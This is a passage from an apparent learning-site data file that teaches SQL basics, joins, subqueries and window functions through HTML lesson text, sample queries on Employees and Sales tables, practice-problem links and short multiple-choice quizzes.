class="learn-p"><b>INSERT</b> adds new rows:</p><div class="learn-code">-- Single row\nINSERT INTO Employees (name, dept, salary, hire_date)\nVALUES (\'Alice\', \'Engineering\', 95000, \'2024-01-15\');\n\n-- Multiple rows\nINSERT INTO Employees (name, dept, salary, hire_date) VALUES\n(\'Bob\', \'Sales\', 72000, \'2024-02-01\'),\n(\'Carol\', \'Engineering\', 105000, \'2023-11-20\');</div><p class="learn-p"><b>UPDATE</b> modifies existing rows:</p><div class="learn-code">UPDATE Employees SET salary = salary * 1.10\nWHERE dept = \'Engineering\' AND hire_date &lt; \'2024-01-01\';</div><p class="learn-p"><b>DELETE</b> removes rows:</p><div class="learn-code">DELETE FROM Employees WHERE dept = \'Sales\' AND salary &lt; 50000;</div></div><div class="learn-section"><div class="learn-h">SELECT, WHERE, and Operators</div><p class="learn-p">The <b>SELECT</b> statement retrieves data. The logical order of execution is:</p><ol class="learn-list"><li><b>FROM</b> — Identify the table(s)</li><li><b>WHERE</b> — Filter rows</li><li><b>GROUP BY</b> — Group rows</li><li><b>HAVING</b> — Filter groups</li><li><b>SELECT</b> — Choose columns, compute expressions</li><li><b>ORDER BY</b> — Sort the result</li><li><b>LIMIT</b> — Restrict number of rows</li></ol><div class="learn-tip"><b>Tip:</b> Knowing the logical execution order is critical. For example, you cannot use a column alias defined in SELECT inside the WHERE clause because WHERE executes before SELECT.</div><p class="learn-p">Key operators in WHERE:</p><ul class="learn-list"><li><code>= , &lt;&gt; , &lt; , &gt; , &lt;= , &gt;=</code> — Comparison operators</li><li><code>AND, OR, NOT</code> — Logical operators</li><li><code>BETWEEN a AND b</code> — Range check (inclusive)</li><li><code>IN (v1, v2, ...)</code> — Membership test</li><li><code>LIKE \'pattern\'</code> — Pattern matching (<code>%</code> = any chars, <code>_</code> = one char)</li><li><code>IS NULL / IS NOT NULL</code> — NULL checks (never use = NULL)</li></ul></div><div class="learn-section"><div class="learn-h">GROUP BY and Aggregate Functions</div><p class="learn-p"><b>GROUP BY</b> groups rows sharing the same value(s) in specified columns. Aggregate functions then operate on each group:</p><table class="learn-table"><tr><th>Function</th><th>Description</th></tr><tr><td>COUNT(*)</td><td>Number of rows in group</td></tr><tr><td>COUNT(col)</td><td>Number of non-NULL values</td></tr><tr><td>SUM(col)</td><td>Sum of values</td></tr><tr><td>AVG(col)</td><td>Average of values</td></tr><tr><td>MIN(col) / MAX(col)</td><td>Minimum / Maximum value</td></tr></table><div class="learn-code">-- Average salary per department, only departments with avg &gt; 80000\nSELECT dept, COUNT(*) AS num_employees, AVG(salary) AS avg_sal\nFROM Employees\nWHERE hire_date &gt;= \'2023-01-01\'\nGROUP BY dept\nHAVING AVG(salary) &gt; 80000\nORDER BY avg_sal DESC;</div><div class="learn-warn"><b>Warning:</b> In standard SQL, every column in SELECT that is not an aggregate must appear in GROUP BY. MySQL allows non-grouped columns (picks an arbitrary value) but this is non-standard and error-prone.</div></div><div class="learn-section"><div class="learn-h">DISTINCT, ORDER BY, LIMIT</div><p class="learn-p"><code>DISTINCT</code> removes duplicate rows from the result. <code>ORDER BY</code> sorts the result (ASC by default, DESC for descending). <code>LIMIT</code> restricts the number of rows returned.</p><div class="learn-code">-- Top 5 highest-paid distinct salaries\nSELECT DISTINCT salary\nFROM Employees\nORDER BY salary DESC\nLIMIT 5;</div></div>',
          code: `-- =============================================
-- SQL Basics: DDL, DML, SELECT, WHERE, GROUP BY
-- =============================================

-- DDL: Create the schema
CREATE TABLE Departments (
    dept_id   INT PRIMARY KEY AUTO_INCREMENT,
    name      VARCHAR(100) NOT NULL UNIQUE,
    location  VARCHAR(200)
);

CREATE TABLE Employees (
    emp_id    INT PRIMARY KEY AUTO_INCREMENT,
    name      VARCHAR(100) NOT NULL,
    dept_id   INT,
    salary    DECIMAL(10,2) CHECK (salary > 0),
    hire_date DATE NOT NULL,
    email     VARCHAR(200) UNIQUE,
    FOREIGN KEY (dept_id) REFERENCES Departments(dept_id)
);

-- DML: Insert sample data
INSERT INTO Departments (name, location) VALUES
('Engineering', 'Building A'),
('Sales', 'Building B'),
('HR', 'Building C');

INSERT INTO Employees (name, dept_id, salary, hire_date, email) VALUES
('Alice',  1, 95000,  '2023-06-15', 'alice@company.com'),
('Bob',    2, 72000,  '2024-02-01', 'bob@company.com'),
('Carol',  1, 105000, '2022-11-20', 'carol@company.com'),
('Dave',   3, 68000,  '2024-03-10', 'dave@company.com'),
('Eve',    1, 110000, '2021-08-05', 'eve@company.com'),
('Frank',  2, 75000,  '2023-09-12', 'frank@company.com');

-- SELECT basics
SELECT * FROM Employees;
SELECT name, salary FROM Employees WHERE dept_id = 1;
SELECT name, salary FROM Employees
WHERE salary BETWEEN 70000 AND 100000;

-- Pattern matching
SELECT * FROM Employees WHERE name LIKE 'A%';
SELECT * FROM Employees WHERE email LIKE '%@company.com';

-- NULL handling
SELECT * FROM Employees WHERE dept_id IS NOT NULL;

-- GROUP BY with aggregates
SELECT d.name AS department,
       COUNT(e.emp_id) AS headcount,
       ROUND(AVG(e.salary), 2) AS avg_salary,
       MAX(e.salary) AS max_salary,
       MIN(e.salary) AS min_salary
FROM Employees e
JOIN Departments d ON e.dept_id = d.dept_id
GROUP BY d.name
HAVING COUNT(e.emp_id) >= 2
ORDER BY avg_salary DESC;

-- DISTINCT
SELECT DISTINCT dept_id FROM Employees;

-- Top N pattern
SELECT name, salary FROM Employees
ORDER BY salary DESC LIMIT 3;

-- UPDATE with conditions
UPDATE Employees SET salary = salary * 1.10
WHERE dept_id = 1 AND hire_date < '2023-01-01';

-- DELETE
DELETE FROM Employees WHERE emp_id = 4;

-- ALTER TABLE
ALTER TABLE Employees ADD bonus DECIMAL(10,2) DEFAULT 0;

-- TRUNCATE vs DELETE
-- TRUNCATE TABLE Employees;  -- DDL, removes all rows, resets auto_increment
-- DELETE FROM Employees;     -- DML, row-by-row, can use WHERE, can rollback`,
          problems: [
            ['Select All - HackerRank', 'https://www.hackerrank.com/challenges/select-all-sql/problem', 'Easy'],
            ['Employee Salaries', 'https://www.hackerrank.com/challenges/salary-of-employees/problem', 'Easy'],
            ['Nth Highest Salary - LeetCode', 'https://leetcode.com/problems/nth-highest-salary/', 'Medium'],
            ['Department Highest Salary', 'https://leetcode.com/problems/department-highest-salary/', 'Hard']
          ],
          mcqs: [
            {q: 'Which of the following is the correct logical order of SQL query execution?', o: ['SELECT → FROM → WHERE → GROUP BY', 'FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY', 'FROM → SELECT → WHERE → GROUP BY', 'SELECT → FROM → GROUP BY → WHERE'], a: 1},
            {q: 'What is the difference between TRUNCATE and DELETE?', o: ['TRUNCATE is DML, DELETE is DDL', 'TRUNCATE can have WHERE, DELETE cannot', 'TRUNCATE is DDL and faster; DELETE is DML and can be rolled back', 'There is no difference'], a: 2},
            {q: 'SELECT dept, MAX(salary) FROM Employees; — without GROUP BY, this query:', o: ['Returns the maximum salary for each department', 'Returns an error in standard SQL', 'Returns the first department and the maximum salary', 'Returns all departments with the same max salary'], a: 1}
          ]
        },
        {
          t: 'Joins',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to Joins</div><p class="learn-p"><b>Joins</b> combine rows from two or more tables based on a related column between them. They are the backbone of relational queries. Understanding when to use which join type is essential for interviews.</p><p class="learn-p">Consider two tables:</p><div class="learn-code">Employees:           Departments:\nemp_id | name | dept_id   dept_id | dept_name\n1      | Alice | 10       10      | Engineering\n2      | Bob   | 20       20      | Sales\n3      | Carol | 30       40      | Marketing\n4      | Dave  | NULL</div></div><div class="learn-section"><div class="learn-h">Types of Joins</div><table class="learn-table"><tr><th>Join Type</th><th>Returns</th><th>NULL behavior</th></tr><tr><td>INNER JOIN</td><td>Only matching rows from both tables</td><td>Excludes non-matching rows</td></tr><tr><td>LEFT (OUTER) JOIN</td><td>All rows from left table + matching from right</td><td>NULLs for non-matching right columns</td></tr><tr><td>RIGHT (OUTER) JOIN</td><td>All rows from right table + matching from left</td><td>NULLs for non-matching left columns</td></tr><tr><td>FULL (OUTER) JOIN</td><td>All rows from both tables</td><td>NULLs where no match on either side</td></tr><tr><td>CROSS JOIN</td><td>Cartesian product of both tables</td><td>Every row paired with every other row</td></tr><tr><td>SELF JOIN</td><td>A table joined with itself</td><td>Useful for hierarchical data</td></tr></table></div><div class="learn-section"><div class="learn-h">INNER JOIN</div><p class="learn-p">Returns only the rows where the join condition is satisfied in <b>both</b> tables.</p><div class="learn-code">SELECT e.name, d.dept_name\nFROM Employees e\nINNER JOIN Departments d ON e.dept_id = d.dept_id;\n-- Result: Alice-Engineering, Bob-Sales\n-- Carol (dept 30 not in Departments) and Dave (NULL dept) excluded\n-- Marketing (dept 40 not in Employees) excluded</div><div class="learn-tip"><b>Tip:</b> INNER JOIN is the default join type. Writing just <code>JOIN</code> is equivalent to <code>INNER JOIN</code>.</div></div><div class="learn-section"><div class="learn-h">LEFT JOIN (LEFT OUTER JOIN)</div><p class="learn-p">Returns <b>all rows from the left table</b> and matching rows from the right table. If no match, right-side columns are NULL.</p><div class="learn-code">SELECT e.name, d.dept_name\nFROM Employees e\nLEFT JOIN Departments d ON e.dept_id = d.dept_id;\n-- Result:\n-- Alice - Engineering\n-- Bob   - Sales\n-- Carol - NULL (dept 30 has no match)\n-- Dave  - NULL (dept is NULL)</div><p class="learn-p"><b>Finding rows with no match</b> (anti-join pattern):</p><div class="learn-code">-- Employees not in any department\nSELECT e.name\nFROM Employees e\nLEFT JOIN Departments d ON e.dept_id = d.dept_id\nWHERE d.dept_id IS NULL;</div></div><div class="learn-section"><div class="learn-h">RIGHT JOIN and FULL OUTER JOIN</div><p class="learn-p"><b>RIGHT JOIN</b> is the mirror of LEFT JOIN — all rows from the right table, matching rows from the left.</p><p class="learn-p"><b>FULL OUTER JOIN</b> returns all rows from both tables, with NULLs where there\'s no match. MySQL does not support FULL OUTER JOIN directly — you simulate it with UNION of LEFT and RIGHT joins.</p><div class="learn-code">-- Simulating FULL OUTER JOIN in MySQL\nSELECT e.name, d.dept_name\nFROM Employees e LEFT JOIN Departments d ON e.dept_id = d.dept_id\nUNION\nSELECT e.name, d.dept_name\nFROM Employees e RIGHT JOIN Departments d ON e.dept_id = d.dept_id;</div></div><div class="learn-section"><div class="learn-h">CROSS JOIN</div><p class="learn-p"><b>CROSS JOIN</b> produces the <b>Cartesian product</b> — every row of one table paired with every row of the other. If table A has m rows and table B has n rows, the result has m × n rows.</p><div class="learn-code">SELECT e.name, d.dept_name\nFROM Employees e CROSS JOIN Departments d;\n-- Returns 4 × 3 = 12 rows</div><div class="learn-warn"><b>Warning:</b> CROSS JOIN on large tables can produce enormous result sets. Use with caution. It is useful for generating combinations (e.g., all possible product-size-color combos).</div></div><div class="learn-section"><div class="learn-h">SELF JOIN</div><p class="learn-p">A <b>self join</b> joins a table with itself. Essential for hierarchical or comparative queries.</p><div class="learn-code">-- Find employees who earn more than their manager\nSELECT e.name AS employee, m.name AS manager\nFROM Employees e\nINNER JOIN Employees m ON e.manager_id = m.emp_id\nWHERE e.salary &gt; m.salary;</div></div><div class="learn-section"><div class="learn-h">NATURAL JOIN and USING</div><p class="learn-p"><b>NATURAL JOIN</b> automatically joins on columns with the same name. <b>USING</b> lets you specify which common column(s) to join on.</p><div class="learn-code">SELECT * FROM Employees NATURAL JOIN Departments;\n-- Joins on dept_id (common column)\n\nSELECT * FROM Employees JOIN Departments USING (dept_id);\n-- Explicit: join on dept_id</div><div class="learn-warn"><b>Warning:</b> Avoid NATURAL JOIN in production — if someone adds a column with the same name to both tables, the join condition silently changes. Always use explicit ON or USING.</div></div><div class="learn-section"><div class="learn-h">Join Performance Considerations</div><p class="learn-p">The DBMS typically implements joins using one of three algorithms:</p><ul class="learn-list"><li><b>Nested Loop Join</b> — For each row in the outer table, scan the inner table. <span class="learn-complexity">O(m × n)</span> in the worst case. Good when one table is small or an index exists.</li><li><b>Hash Join</b> — Build a hash table on the smaller table, probe with the larger. <span class="learn-complexity">O(m + n)</span>. Best for equi-joins on large tables without indexes.</li><li><b>Sort-Merge Join</b> — Sort both tables on the join key, then merge. <span class="learn-complexity">O(m log m + n log n)</span>. Good when data is already sorted or indexes exist.</li></ul></div>',
          code: `-- =============================================
-- Joins: Complete Examples
-- =============================================

-- Setup
CREATE TABLE Departments (
    dept_id   INT PRIMARY KEY,
    dept_name VARCHAR(100)
);
CREATE TABLE Employees (
    emp_id     INT PRIMARY KEY,
    name       VARCHAR(100),
    dept_id    INT,
    salary     DECIMAL(10,2),
    manager_id INT,
    FOREIGN KEY (dept_id) REFERENCES Departments(dept_id),
    FOREIGN KEY (manager_id) REFERENCES Employees(emp_id)
);

INSERT INTO Departments VALUES (10,'Engineering'),(20,'Sales'),(30,'HR'),(40,'Marketing');
INSERT INTO Employees VALUES
(1,'Alice',10,95000,NULL), (2,'Bob',20,72000,1),
(3,'Carol',10,105000,1),   (4,'Dave',30,68000,2),
(5,'Eve',10,110000,1),     (6,'Frank',NULL,75000,3);

-- INNER JOIN
SELECT e.name, d.dept_name
FROM Employees e INNER JOIN Departments d ON e.dept_id = d.dept_id;

-- LEFT JOIN (all employees, even those without a department)
SELECT e.name, COALESCE(d.dept_name, 'No Dept') AS department
FROM Employees e LEFT JOIN Departments d ON e.dept_id = d.dept_id;

-- Anti-join: departments with no employees
SELECT d.dept_name
FROM Departments d LEFT JOIN Employees e ON d.dept_id = e.dept_id
WHERE e.emp_id IS NULL;

-- RIGHT JOIN
SELECT e.name, d.dept_name
FROM Employees e RIGHT JOIN Departments d ON e.dept_id = d.dept_id;

-- FULL OUTER JOIN (MySQL simulation)
SELECT e.name, d.dept_name
FROM Employees e LEFT JOIN Departments d ON e.dept_id = d.dept_id
UNION
SELECT e.name, d.dept_name
FROM Employees e RIGHT JOIN Departments d ON e.dept_id = d.dept_id;

-- CROSS JOIN
SELECT e.name, d.dept_name
FROM Employees e CROSS JOIN Departments d;

-- SELF JOIN: employee with their manager's name
SELECT e.name AS employee, m.name AS manager
FROM Employees e
LEFT JOIN Employees m ON e.manager_id = m.emp_id;

-- SELF JOIN: employees earning more than their manager
SELECT e.name AS employee, e.salary AS emp_salary,
       m.name AS manager, m.salary AS mgr_salary
FROM Employees e
INNER JOIN Employees m ON e.manager_id = m.emp_id
WHERE e.salary > m.salary;

-- Multi-table join
SELECT e.name, d.dept_name, m.name AS manager_name
FROM Employees e
LEFT JOIN Departments d ON e.dept_id = d.dept_id
LEFT JOIN Employees m ON e.manager_id = m.emp_id;

-- USING clause
SELECT name, dept_name
FROM Employees JOIN Departments USING (dept_id);`,
          problems: [
            ['Combine Two Tables - LeetCode', 'https://leetcode.com/problems/combine-two-tables/', 'Easy'],
            ['Employees Earning More Than Managers', 'https://leetcode.com/problems/employees-earning-more-than-their-managers/', 'Easy'],
            ['Department Highest Salary', 'https://leetcode.com/problems/department-highest-salary/', 'Hard'],
            ['African Cities - HackerRank', 'https://www.hackerrank.com/challenges/african-cities/problem', 'Easy']
          ],
          mcqs: [
            {q: 'Which join returns all rows from both tables, filling NULLs where there is no match?', o: ['INNER JOIN', 'LEFT JOIN', 'CROSS JOIN', 'FULL OUTER JOIN'], a: 3},
            {q: 'Table A has 5 rows and Table B has 4 rows. How many rows does CROSS JOIN produce?', o: ['5', '9', '20', '4'], a: 2},
            {q: 'Which of the following is an anti-join pattern?', o: ['INNER JOIN ... WHERE pk IS NOT NULL', 'LEFT JOIN ... WHERE right_table.pk IS NULL', 'CROSS JOIN ... WHERE 1=1', 'RIGHT JOIN ... WHERE left_table.pk IS NOT NULL'], a: 1}
          ]
        },
        {
          t: 'Subqueries & Nested Queries',
          learn: '<div class="learn-section"><div class="learn-h">What are Subqueries?</div><p class="learn-p">A <b>subquery</b> (also called a <b>nested query</b> or <b>inner query</b>) is a query embedded within another SQL query. The outer query is called the <b>main query</b> or <b>parent query</b>. Subqueries can appear in SELECT, FROM, WHERE, and HAVING clauses.</p><p class="learn-p">Subqueries are classified by:</p><ul class="learn-list"><li><b>Location</b>: WHERE subquery, FROM subquery (derived table), SELECT subquery (scalar)</li><li><b>Correlation</b>: Correlated vs Non-correlated</li><li><b>Return type</b>: Scalar (single value), Row, Table</li></ul></div><div class="learn-section"><div class="learn-h">Non-Correlated Subqueries</div><p class="learn-p">A <b>non-correlated subquery</b> is independent of the outer query. It executes once, and the result is used by the outer query.</p><div class="learn-code">-- Employees earning above the average salary\nSELECT name, salary\nFROM Employees\nWHERE salary &gt; (SELECT AVG(salary) FROM Employees);\n\n-- Employees in the Engineering department\nSELECT name FROM Employees\nWHERE dept_id IN (SELECT dept_id FROM Departments WHERE dept_name = \'Engineering\');</div><p class="learn-p"><b>Operators with subqueries:</b></p><ul class="learn-list"><li><code>IN</code> — Check if value is in the subquery result set</li><li><code>NOT IN</code> — Check if value is NOT in the result set</li><li><code>ANY / SOME</code> — True if comparison holds for at least one value</li><li><code>ALL</code> — True if comparison holds for every value</li><li><code>EXISTS</code> — True if the subquery returns at least one row</li></ul><div class="learn-warn"><b>Warning:</b> <code>NOT IN</code> fails silently when the subquery returns NULL values. Always filter NULLs: <code>WHERE col NOT IN (SELECT col FROM ... WHERE col IS NOT NULL)</code> or use <code>NOT EXISTS</code> instead.</div></div><div class="learn-section"><div class="learn-h">Correlated Subqueries</div><p class="learn-p">A <b>correlated subquery</b> references columns from the outer query. It executes <b>once for each row</b> of the outer query, making it potentially slower.</p><div class="learn-code">-- Employees earning more than the average salary of their department\nSELECT e.name, e.salary, e.dept_id\nFROM Employees e\nWHERE e.salary &gt; (\n    SELECT AVG(e2.salary)\n    FROM Employees e2\n    WHERE e2.dept_id = e.dept_id  -- correlated: references outer e\n);</div><div class="learn-tip"><b>Tip:</b> You can often rewrite correlated subqueries as JOINs for better performance. The optimizer may do this automatically, but it\'s good practice to know both forms.</div></div><div class="learn-section"><div class="learn-h">EXISTS and NOT EXISTS</div><p class="learn-p"><b>EXISTS</b> returns TRUE if the subquery returns at least one row. It is often more efficient than IN for correlated checks because it short-circuits (stops as soon as one match is found).</p><div class="learn-code">-- Departments that have at least one employee\nSELECT d.dept_name\nFROM Departments d\nWHERE EXISTS (\n    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id\n);\n\n-- Departments with no employees\nSELECT d.dept_name\nFROM Departments d\nWHERE NOT EXISTS (\n    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id\n);</div></div><div class="learn-section"><div class="learn-h">Subqueries in FROM (Derived Tables)</div><p class="learn-p">A subquery in the FROM clause creates a <b>derived table</b> (also called an <b>inline view</b>). It must have an alias.</p><div class="learn-code">-- Average of department averages\nSELECT AVG(dept_avg) AS avg_of_averages\nFROM (\n    SELECT dept_id, AVG(salary) AS dept_avg\n    FROM Employees\n    GROUP BY dept_id\n) AS dept_averages;</div></div><div class="learn-section"><div class="learn-h">Subqueries in SELECT (Scalar Subqueries)</div><p class="learn-p">A <b>scalar subquery</b> returns a single value and can be used in the SELECT list.</p><div class="learn-code">-- Each employee with their department\'s average salary\nSELECT name, salary,\n    (SELECT AVG(salary) FROM Employees e2\n     WHERE e2.dept_id = e.dept_id) AS dept_avg\nFROM Employees e;</div><div class="learn-warn"><b>Warning:</b> A scalar subquery must return exactly one row and one column. If it returns more, you get a runtime error.</div></div><div class="learn-section"><div class="learn-h">Common Subquery Patterns for Interviews</div><p class="learn-p">These patterns are frequently tested:</p><ol class="learn-list"><li><b>Nth highest salary</b>: Use LIMIT with OFFSET or a correlated subquery</li><li><b>Top N per group</b>: Use correlated subquery counting how many in the same group are higher</li><li><b>Duplicate detection</b>: GROUP BY + HAVING COUNT &gt; 1</li><li><b>Anti-join</b>: NOT EXISTS or LEFT JOIN ... WHERE pk IS NULL</li></ol><div class="learn-code">-- Second highest salary\nSELECT MAX(salary) AS second_highest\nFROM Employees\nWHERE salary &lt; (SELECT MAX(salary) FROM Employees);\n\n-- Alternative: using LIMIT OFFSET\nSELECT DISTINCT salary FROM Employees\nORDER BY salary DESC LIMIT 1 OFFSET 1;</div></div>',
          code: `-- =============================================
-- Subqueries & Nested Queries
-- =============================================

-- 1. Non-correlated: employees earning above average
SELECT name, salary
FROM Employees
WHERE salary > (SELECT AVG(salary) FROM Employees);

-- 2. IN subquery: employees in Engineering or Sales
SELECT name FROM Employees
WHERE dept_id IN (
    SELECT dept_id FROM Departments
    WHERE dept_name IN ('Engineering', 'Sales')
);

-- 3. ALL: employees earning more than everyone in Sales
SELECT name, salary FROM Employees
WHERE salary > ALL (
    SELECT salary FROM Employees e
    JOIN Departments d ON e.dept_id = d.dept_id
    WHERE d.dept_name = 'Sales'
);

-- 4. ANY: employees earning more than at least one person in Engineering
SELECT name, salary FROM Employees
WHERE salary > ANY (
    SELECT salary FROM Employees e
    JOIN Departments d ON e.dept_id = d.dept_id
    WHERE d.dept_name = 'Engineering'
);

-- 5. Correlated: employees earning more than their dept average
SELECT e.name, e.salary, e.dept_id
FROM Employees e
WHERE e.salary > (
    SELECT AVG(e2.salary)
    FROM Employees e2
    WHERE e2.dept_id = e.dept_id
);

-- 6. EXISTS: departments that have employees
SELECT d.dept_name
FROM Departments d
WHERE EXISTS (
    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id
);

-- 7. NOT EXISTS: departments with no employees
SELECT d.dept_name
FROM Departments d
WHERE NOT EXISTS (
    SELECT 1 FROM Employees e WHERE e.dept_id = d.dept_id
);

-- 8. Derived table: average of department averages
SELECT ROUND(AVG(dept_avg), 2) AS overall_avg
FROM (
    SELECT dept_id, AVG(salary) AS dept_avg
    FROM Employees
    GROUP BY dept_id
) AS dept_averages;

-- 9. Scalar subquery in SELECT
SELECT e.name, e.salary,
    (SELECT AVG(salary) FROM Employees e2
     WHERE e2.dept_id = e.dept_id) AS dept_avg,
    e.salary - (SELECT AVG(salary) FROM Employees e2
     WHERE e2.dept_id = e.dept_id) AS diff_from_avg
FROM Employees e;

-- 10. Nth highest salary (3rd highest)
SELECT DISTINCT salary FROM Employees
ORDER BY salary DESC LIMIT 1 OFFSET 2;

-- 11. Find duplicates
SELECT email, COUNT(*) AS cnt
FROM Employees
GROUP BY email
HAVING COUNT(*) > 1;

-- 12. Delete duplicates (keep the one with lowest id)
DELETE e1 FROM Employees e1
INNER JOIN Employees e2
ON e1.email = e2.email AND e1.emp_id > e2.emp_id;`,
          problems: [
            ['Nth Highest Salary', 'https://leetcode.com/problems/nth-highest-salary/', 'Medium'],
            ['Department Top Three Salaries', 'https://leetcode.com/problems/department-top-three-salaries/', 'Hard'],
            ['Duplicate Emails', 'https://leetcode.com/problems/duplicate-emails/', 'Easy'],
            ['Customers Who Never Order', 'https://leetcode.com/problems/customers-who-never-order/', 'Easy']
          ],
          mcqs: [
            {q: 'A correlated subquery:', o: ['Executes once for the entire outer query', 'Executes once for each row of the outer query', 'Cannot reference columns from the outer query', 'Is always faster than a non-correlated subquery'], a: 1},
            {q: 'What happens if NOT IN subquery returns a NULL value?', o: ['It returns all rows', 'It returns no rows', 'It throws an error', 'It ignores the NULL and works normally'], a: 1},
            {q: 'Which is generally more efficient for checking existence?', o: ['IN with a subquery', 'EXISTS with a correlated subquery', 'CROSS JOIN', 'They are always equivalent'], a: 1}
          ]
        },
        {
          t: 'Window Functions',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to Window Functions</div><p class="learn-p"><b>Window functions</b> (also called <b>analytic functions</b>) perform calculations across a set of rows related to the current row — called a <b>window</b> or <b>frame</b>. Unlike GROUP BY, window functions do <b>not collapse rows</b>; each row retains its identity in the result.</p><p class="learn-p">Syntax:</p><div class="learn-code">function_name(args) OVER (\n    [PARTITION BY col1, col2, ...]\n    [ORDER BY col3, col4, ...]\n    [ROWS/RANGE BETWEEN ... AND ...]\n)</div><ul class="learn-list"><li><b>PARTITION BY</b> — Divides rows into partitions (like GROUP BY but without collapsing)</li><li><b>ORDER BY</b> — Defines the order within each partition</li><li><b>Frame clause</b> — Defines which rows relative to the current row are included (ROWS BETWEEN, RANGE BETWEEN)</li></ul></div><div class="learn-section"><div class="learn-h">Ranking Functions</div><table class="learn-table"><tr><th>Function</th><th>Description</th><th>Example (salaries: 100, 100, 90, 80)</th></tr><tr><td>ROW_NUMBER()</td><td>Unique sequential number (no ties)</td><td>1, 2, 3, 4</td></tr><tr><td>RANK()</td><td>Rank with gaps for ties</td><td>1, 1, 3, 4</td></tr><tr><td>DENSE_RANK()</td><td>Rank without gaps for ties</td><td>1, 1, 2, 3</td></tr><tr><td>NTILE(n)</td><td>Divide into n roughly equal groups</td><td>NTILE(2): 1,1,2,2</td></tr></table><div class="learn-code">SELECT name, dept_id, salary,\n    ROW_NUMBER() OVER (PARTITION BY dept_id ORDER BY salary DESC) AS row_num,\n    RANK()       OVER (PARTITION BY dept_id ORDER BY salary DESC) AS rnk,\n    DENSE_RANK() OVER (PARTITION BY dept_id ORDER BY salary DESC) AS dense_rnk\nFROM Employees;</div><div class="learn-tip"><b>Tip:</b> The difference between RANK and DENSE_RANK is a classic interview question. RANK skips numbers after ties (1,1,3); DENSE_RANK does not (1,1,2).</div></div><div class="learn-section"><div class="learn-h">Aggregate Window Functions</div><p class="learn-p">Standard aggregates (SUM, AVG, COUNT, MIN, MAX) can be used as window functions:</p><div class="learn-code">SELECT name, salary,\n    SUM(salary) OVER (ORDER BY hire_date) AS running_total,\n    AVG(salary) OVER (PARTITION BY dept_id) AS dept_avg,\n    COUNT(*)    OVER () AS total_employees\nFROM Employees;</div><p class="learn-p">The <b>running total</b> pattern is very common: <code>SUM(col) OVER (ORDER BY date_col)</code> computes a cumulative sum.</p></div><div class="learn-section"><div class="learn-h">Value Functions: LAG, LEAD, FIRST_VALUE, LAST_VALUE</div><p class="learn-p">These functions access values from other rows without a self-join:</p><table class="learn-table"><tr><th>Function</th><th>Description</th></tr><tr><td>LAG(col, n, default)</td><td>Value of col from n rows BEFORE current row</td></tr><tr><td>LEAD(col, n, default)</td><td>Value of col from n rows AFTER current row</td></tr><tr><td>FIRST_VALUE(col)</td><td>Value of col from the first row in the window frame</td></tr><tr><td>LAST_VALUE(col)</td><td>Value of col from the last row in the window frame</td></tr><tr><td>NTH_VALUE(col, n)</td><td>Value of col from the nth row in the window frame</td></tr></table><div class="learn-code">-- Compare each employee\'s salary with previous and next hire\nSELECT name, hire_date, salary,\n    LAG(salary, 1, 0)  OVER (ORDER BY hire_date) AS prev_salary,\n    LEAD(salary, 1, 0) OVER (ORDER BY hire_date) AS next_salary,\n    salary - LAG(salary, 1, 0) OVER (ORDER BY hire_date) AS diff\nFROM Employees;</div><div class="learn-warn"><b>Warning:</b> LAST_VALUE with the default frame (RANGE BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) gives the current row\'s value, not the actual last value. Use <code>ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING</code> to get the true last value.</div></div><div class="learn-section"><div class="learn-h">Window Frame Specification</div><p class="learn-p">The frame clause defines which rows relative to the current row are in the window:</p><div class="learn-code">ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW      -- default for ORDER BY\nROWS BETWEEN 2 PRECEDING AND 2 FOLLOWING               -- 5-row sliding window\nROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING -- entire partition\nRANGE BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW       -- based on value, not position</div><p class="learn-p"><b>ROWS</b> counts physical rows; <b>RANGE</b> considers logical value ranges. For most use cases, ROWS is more predictable.</p><div class="learn-code">-- 3-month moving average\nSELECT month, revenue,\n    AVG(revenue) OVER (\n        ORDER BY month\n        ROWS BETWEEN 2 PRECEDING AND CURRENT ROW\n    ) AS moving_avg_3m\nFROM Monthly_Revenue;</div></div><div class="learn-section"><div class="learn-h">Common Interview Patterns</div><ol class="learn-list"><li><b>Top N per group</b>: Use ROW_NUMBER() OVER (PARTITION BY group_col ORDER BY rank_col) and filter WHERE row_num &lt;= N</li><li><b>Running total</b>: SUM() OVER (ORDER BY date_col)</li><li><b>Year-over-year comparison</b>: LAG(value, 1) OVER (ORDER BY year)</li><li><b>Percentile / quartile</b>: NTILE(4) OVER (ORDER BY salary)</li><li><b>Consecutive sequences</b>: ROW_NUMBER differences</li></ol></div>',
          code: `-- =============================================
-- Window Functions: Complete Examples
-- =============================================

-- Setup data
CREATE TABLE Sales (
    id        INT PRIMARY KEY,
    emp_name  VARCHAR(100),
    dept      VARCHAR(50),
    amount    DECIMAL(10,2),
    sale_date DATE
);

INSERT INTO Sales VALUES
(1,'Alice','Electronics',5000,'2024-01-15'),
(2,'Bob','Electronics',3000,'2024-01-20'),
(3,'Carol','Clothing',4500,'2024-02-10'),
(4,'Alice','Electronics',7000,'2024-02-15'),
(5,'Dave','Clothing',3500,'2024-02-20'),
(6,'Bob','Electronics',6000,'2024-03-01'),
(7,'Carol','Clothing',5500,'2024-03-15'),
(8,'Alice','Electronics',4000,'2024-03-20');

-- 1. Ranking functions
SELECT emp_name, dept, amount,
    ROW_NUMBER() OVER (PARTITION BY dept ORDER BY amount DESC) AS row_num,
    RANK()       OVER (PARTITION BY dept ORDER BY amount DESC) AS rnk,
    DENSE_RANK() OVER (PARTITION BY dept ORDER BY amount DESC) AS dense_rnk
FROM Sales;

-- 2. Top 2 sales per department
SELECT * FROM (
    SELECT emp_name, dept, amount,
        ROW_NUMBER() OVER (PARTITION BY dept ORDER BY amount DESC) AS rn
    FROM Sales
) ranked
WHERE rn <= 2;

-- 3. Running total of sales by date
SELECT sale_date, emp_name, amount,
    SUM(amount) OVER (ORDER BY sale_date
        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
    ) AS running_total
FROM Sales;

-- 4. Department-level aggregates alongside row-level data
SELECT emp_name, dept, amount,
